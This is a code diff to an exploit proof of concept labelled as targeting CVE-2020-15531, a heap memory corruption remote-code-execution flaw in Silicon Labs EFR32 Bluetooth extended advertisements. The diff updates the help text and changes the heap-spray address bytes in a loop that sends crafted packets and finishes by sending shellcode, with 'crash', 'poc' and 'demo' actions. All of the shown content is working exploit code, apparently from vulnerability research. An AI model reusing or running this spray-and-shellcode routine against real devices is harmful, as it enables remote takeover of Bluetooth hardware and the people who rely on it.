@@ -6,7 +6,8 @@ class TestSet():
     def __init__(self, subparsers):
         self.cmd = 'silabs_extadv_rce'
 
-        self.parser = subparsers.add_parser(self.cmd, help='Silicon Labs EFR32 Extended Advertisement Heap Memory Corruption RCE PoC')
+        self.parser = subparsers.add_parser(self.cmd,
+                          help='[CVE-2020-15531] Silicon Labs EFR32 Extended Advertisement Heap Memory Corruption RCE PoC')
         self.parser.add_argument('action', choices=['crash', 'poc', 'demo'], help='Choose an action')
         self.funcs = {'crash':self.crash, 'poc':self.poc, 'demo':self.demo}
 
@@ -58,10 +59,10 @@ class TestSet():
             self.hm.send_ac_pdu_header(0x07)
 
             if cnt == spray_max:
-                bulk = b"\x00\x20\x90\x40" * 64
+                bulk = b"\x00\x20\x7c\x40" * 64
                 params = struct.pack("B", 0x3c) + struct.pack("B", 0x00) +  bulk[:253]
             elif cnt < spray_max:
-                bulk = b"\x00\x20\x90\x40" * 64
+                bulk = b"\x00\x20\x7c\x40" * 64
                 params = struct.pack("B", 0x10) + struct.pack("B", 0x00) +  bulk[:253]
             else:
                 bulk = shellcode
